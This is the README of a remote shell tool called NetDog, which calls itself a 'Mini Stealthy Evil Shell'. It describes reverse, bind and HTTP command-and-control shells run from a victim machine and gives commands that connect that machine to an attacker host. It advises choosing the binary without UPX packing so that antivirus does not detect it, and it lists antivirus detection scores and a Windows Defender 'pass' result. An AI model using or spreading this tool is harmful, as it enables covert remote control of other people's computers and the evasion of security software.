# NetDog
Mini Stealthy Evil Shell

## Roadmap
- Reverse Shell
    - [x] TCP
    - [x] UDP
- Bind Shell
    - [x] TCP
    - [x] UDP
- HTTP shell
    - [ ] Synchronous
    - [x] Asynchronous
    - [ ] TLS
- Others
    - [ ] IPv6
    - [ ] Encryption
    - [x] Auto reconnect
    - [ ] SSH backdoor server

## Choosing binary
- There are only 2 types: `nd` (linux/amd64) `nd.exe` (windows/amd64)  
- For windows, choose the one without upx to avoid being detected as virus.  

## Reverse shell
```
+--------------------------------+            +--------------------------------+
|                                |            |                                |
|                         victim +------------> attacker (10.1.1.1)            |
| ./nd -host 10.1.1.1 -port 1234 |            | nc -lvnp 1234                  |
|                                |            |                                |
+--------------------------------+            +--------------------------------+
```

## Bind shell
```
+--------------------+            +--------------------+
|                    |            |                    |
|  victim (10.1.1.2) <------------+ attacker           |
|       ./nd -l 1234 |            | nc 10.1.1.2 1234   |
|                    |            |                    |
+--------------------+            +--------------------+
```

## HTTP shell
### Asynchronous
```
+-------------------------+                 +------------------------+
|victim                   |                 |attacker                |
|http client              |                 |http server             |
|                         |                 |                        |
|                         |   find command  |                        |
|                         +----------------->                        |
|            execute <----+                 |                        |
|                         +----------------->                        |
|                         |    response     |                        |
|                         |                 |                        |
|                         |                 |                        |
+-------------------------+                 +------------------------+
```
```bash
./nd -async -m http -server # server
./nd -host $ATTACKERIP -port $ATTACKERPORT -async -m http # client
```

## AV status
2021-05-23 03:13:04 UTC

| type | size | score | windows defender |
| - | - | -| - |
|without upx | 2.2 MB|[4/69](https://www.virustotal.com/gui/file/b042c2498ab6ee36ce998842d4ed4592d46f55026677f1f6e750edf7b6a2411d/detection)| pass|
|with upx | 663 KB|[6/69](https://www.virustotal.com/gui/file/b6f9b09b20cda55d3e87d4f3c74971bffa65781c297ea4742c5987cc69b9b391/detection)| not pass|

## Usage
```
$./nd -h
Usage of ./nd:
  -host string
        Host (default "127.0.0.1")
  -l    Bind mode
  -port string
        Port (default "1234")
  -recon string
        Reconnecting Time (default "15s")
  -shell string
        Unix Shell (default "/bin/sh")
  -u    Enable UDP
```